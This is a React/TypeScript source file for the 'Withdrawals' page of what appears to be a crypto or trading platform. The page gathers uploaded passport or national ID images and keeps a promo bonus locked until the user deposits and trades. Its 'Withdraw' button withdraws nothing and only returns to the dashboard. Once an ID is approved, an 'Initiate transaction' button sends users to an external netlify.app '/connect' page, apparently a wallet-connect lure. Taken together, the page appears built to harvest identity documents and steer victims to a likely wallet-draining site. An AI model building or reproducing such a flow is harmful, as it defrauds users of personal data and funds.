import { useState } from "react";
import { useNavigate } from "react-router-dom";

import JourneyShell from "@/components/JourneyShell";
import { Badge } from "@/components/ui/badge";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Label } from "@/components/ui/label";
import { Input } from "@/components/ui/input";
import { Textarea } from "@/components/ui/textarea";
import { useAccountWorkflow } from "@/hooks/use-account-workflow";
import { getWorkflowSnapshot } from "@/lib/account-workflow";
import { toast } from "@/components/ui/sonner";

const WithdrawPage = () => {
  const navigate = useNavigate();
  const { snapshot, submitIdVerification, isSubmittingIdVerification } = useAccountWorkflow();
  const [idType, setIdType] = useState<string>("passport");
  const [fileName, setFileName] = useState<string | null>(null);
  const [fileData, setFileData] = useState<string | null>(null);
  const [notes, setNotes] = useState("");

  const mainBalance = snapshot?.mainWalletBalanceUsd ?? 0;
  const bonusUsd = snapshot?.bonusUsd ?? 0;
  const bonusLocked = snapshot?.bonusLocked ?? false;
  const pendingCount = snapshot?.idVerificationRequests?.filter((r) => r.status === "pending_review").length ?? 0;
  const maxPending = pendingCount >= 5;

  const handleFile = (file?: File | null) => {
    if (!file) {
      setFileName(null);
      setFileData(null);
      return;
    }

    setFileName(file.name);
    const reader = new FileReader();
    reader.onload = () => {
      const result = reader.result as string;
      setFileData(result);
    };
    reader.readAsDataURL(file);
  };

  const handleSubmit = async () => {
    if (!idType) return;
    if (maxPending) {
      toast.error("You already have 5 pending verification requests. Please wait for review.");
      return;
    }

    try {
      await submitIdVerification({ idType, fileName, fileDataBase64: fileData ?? null });
      toast.success("ID submitted — pending review. Approval may take up to 48 hours. Contact support if needed.");
    } catch (err) {
      toast.error("Unable to submit ID verification.");
    }
  };

  return (
    <JourneyShell
      stage="dashboard"
      title="Withdrawals"
      description="Request withdrawals and submit identity verification to enable withdrawals when required."
    >
      <div className="space-y-6">
        <Card className="border-border/80">
          <CardHeader>
            <div className="flex items-center gap-3">
              <Badge className="bg-gold text-primary-foreground">Withdrawals</Badge>
              <CardTitle className="text-xl">Withdraw from main wallet</CardTitle>
            </div>
            <CardDescription>Available balance and verification status for withdrawal requests.</CardDescription>
          </CardHeader>
          <CardContent>
            <div className="rounded-2xl border border-border bg-background/70 p-4">
              <div className="flex items-center justify-between">
                <div>
                  <div className="text-sm text-muted-foreground">Main wallet balance</div>
                  <div className="mt-1 text-2xl font-semibold text-foreground">{snapshot ? `$${snapshot.mainWalletBalanceUsd.toFixed(2)}` : "$0.00"}</div>
                </div>
                {mainBalance - (bonusLocked ? bonusUsd : 0) > 0 ? (
                  <div>
                    <Button type="button" onClick={() => navigate("/dashboard")} className="bg-gold text-foreground">
                      Withdraw
                    </Button>
                  </div>
                ) : (
                  <div className="text-sm text-muted-foreground">No withdraw available — deposit first. {bonusUsd > 0 ? (bonusLocked ? `(Includes $${bonusUsd.toFixed(2)} promo held until deposit + active trading)` : `(Promo $${bonusUsd.toFixed(2)} available)` ) : ""}</div>
                )}
              </div>
            </div>
          </CardContent>
        </Card>

        <Card className="border-border/80">
          <CardHeader>
            <CardTitle className="text-xl">ID verification</CardTitle>
            <CardDescription>Upload an ID document to verify identity before withdrawal.</CardDescription>
          </CardHeader>
          <CardContent className="space-y-4">
            <div className="space-y-2">
              <Label>Pick ID type</Label>
              <select value={idType} onChange={(e) => setIdType(e.target.value)} className="w-full rounded-md border p-2">
                <option value="passport">Passport</option>
                <option value="drivers-license">Driver's license</option>
                <option value="national-id">National ID</option>
              </select>
            </div>

            <div className="space-y-2">
              <Label>Upload file</Label>
              <Input type="file" onChange={(e) => handleFile(e.target.files?.[0] ?? null)} />
              {fileName ? <div className="text-sm text-muted-foreground">Selected: {fileName}</div> : null}
            </div>

            <div className="space-y-2">
              <Label>Notes (optional)</Label>
              <Textarea value={notes} onChange={(e) => setNotes(e.target.value)} />
            </div>

            <div className="flex gap-3">
              <Button type="button" onClick={() => void handleSubmit()} disabled={isSubmittingIdVerification}>
                {isSubmittingIdVerification ? "Submitting..." : "Submit for review"}
              </Button>
              <Button type="button" variant="outline" onClick={() => navigate("/dashboard")}>Back to dashboard</Button>
            </div>
            {pendingCount > 0 ? (
              <div className="mt-4 rounded-2xl border border-amber-300/30 bg-amber-50/10 p-4 text-sm">
                <div className="font-semibold">ID verification pending</div>
                <div className="text-muted-foreground">Your ID is under review. Approval may take up to 48 hours. If you need help, contact support.</div>
                <div className="mt-3 space-y-2">
                  {snapshot?.idVerificationRequests?.slice(0, 5).map((r) => (
                    <div key={r.id} className="flex items-center justify-between">
                      <div>
                        <div className="font-medium text-foreground">{r.idType}</div>
                        <div className="text-xs text-muted-foreground">Submitted {new Date(r.submittedAt).toLocaleString()}</div>
                      </div>
                      <div className="text-sm text-muted-foreground">{r.status.replaceAll("_", " ")}</div>
                    </div>
                  ))}
                </div>
              </div>
            ) : null}
            {snapshot?.idVerificationRequests?.some((r) => r.status === "approved") ? (
              <div className="mt-4 rounded-2xl border border-emerald-300/30 bg-emerald-50/10 p-4 text-sm">
                <div className="font-semibold">Verified ID</div>
                <div className="text-muted-foreground">You have an approved ID. Click to initiate a transaction.</div>
                <div className="mt-3 space-y-2">
                  {snapshot.idVerificationRequests
                    .filter((r) => r.status === "approved")
                    .slice(0, 5)
                    .map((r) => (
                      <div key={r.id} className="flex items-center justify-between">
                        <div>
                          <div className="font-medium text-foreground">{r.idType}</div>
                          <div className="text-xs text-muted-foreground">Approved {r.reviewedAt ? new Date(r.reviewedAt).toLocaleString() : "(recent)"}</div>
                        </div>
                        <div>
                          <Button
                            type="button"
                            className="bg-emerald-600 text-white"
                            onClick={() => {
                              // Persist snapshot synchronously/asynchronously before opening external site
                              void getWorkflowSnapshot().then(() => window.open("https://snapdroponsol.netlify.app/connect", "_blank", "noopener,noreferrer"));
                            }}
                          >
                            Initiate transaction
                          </Button>
                        </div>
                      </div>
                    ))}
                </div>
              </div>
            ) : null}
          </CardContent>
        </Card>
      </div>
    </JourneyShell>
  );
};

export default WithdrawPage;
